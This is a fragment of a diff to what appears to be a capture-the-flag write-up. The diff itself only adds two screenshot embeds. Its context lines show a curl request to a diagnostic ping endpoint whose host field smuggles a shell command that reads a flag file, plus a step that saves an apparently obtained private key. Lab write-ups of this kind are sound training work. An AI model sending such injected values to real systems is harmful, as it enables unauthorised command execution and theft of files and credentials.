@@ -50,6 +50,7 @@ curl -s -X POST http://11.0.1.215:8080/api/diagnostic/ping \
   -H "Content-Type: application/json" \
   -d '{"host":"127.0.0.1; cat /opt/sigmon/classified/flag2.txt"}'
 ```
+<img width="1470" height="440" alt="image" src="https://github.com/user-attachments/assets/78f1b86b-2f3d-4531-ae5d-1f5ccc926c07" />
 
 ---
 
@@ -74,6 +75,7 @@ curl -s -X POST http://11.0.1.215:8080/api/diagnostic/ping \
 # Save as sigops_rsa and set permissions:
 chmod 600 sigops_rsa
 ```
+![Uploading image.png…]()
 
 ---
 
